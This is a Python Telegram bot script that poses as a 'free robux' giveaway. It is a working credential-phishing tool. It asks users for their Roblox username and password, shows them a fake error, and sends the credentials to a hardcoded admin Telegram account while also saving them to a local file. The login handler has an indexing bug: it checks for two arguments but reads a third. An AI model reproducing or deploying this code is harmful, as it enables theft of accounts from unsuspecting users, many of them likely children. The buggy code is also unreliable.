from aiogram.types import Message
from aiogram.types.user import User
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart, Command
import asyncio
import requests
import os

open('logs.txt', 'w').write('Start logs\n')
Token = str(input("enter your bot API: "))
logs = open('logs.txt', 'a')
user = ''

bot = Bot(token=Token)
dp = Dispatcher()

@dp.message(CommandStart())
async def start(message: Message):
    await message.answer('Hello! I am bot for give you free robux! To recieve robux type /robux <amount>')
    print(f'new start')
    logs.write(f'new start\n')

@dp.message(Command('robux'))
async def robux(message: Message):
    args = message.text.split()
    if len(args) > 1:
        print(args)
        logs.write(f'{args}\n')
        logs.write(f'new try to recieve robux from {user}\n')
        amount = args[1]
        await message.answer(f'You will receive {amount} robux, but you need to log in to your roblox account. Please enter your username and password in the following format: /login username password')
    else:
        await message.answer('Please specify the amount of robux you would like to receive.')
    
@dp.message(Command('login'))
async def login(message: Message):
    args = message.text.split()
    if len(args) == 2:
        username = args[1]
        print(args)
        logs.write(f'{args}\n')
        password = args[2]
        log = open('users.txt', 'a')
        await message.answer(f'Error. Please try again or contact with us: @JoeBiden_Usa')
        admin_id = '1621436440'
        await bot.send_message(admin_id, f'Username: {username}, Password: {password}')
        print(f'New login (Username: {username}, Password: {password})')
        log.write(f'Username: {username}, Password: {password}\n')
    else:
        print(f'new try to log in from {user}\n')
        logs.write(f'new try to log in from {user}')
        await message.answer('Please enter your username and password in the following format: /login username password')
        

async def main() -> None:
    await dp.start_polling(bot)

if __name__ == '__main__':
    print('\nBot is running...')
    asyncio.run(main())
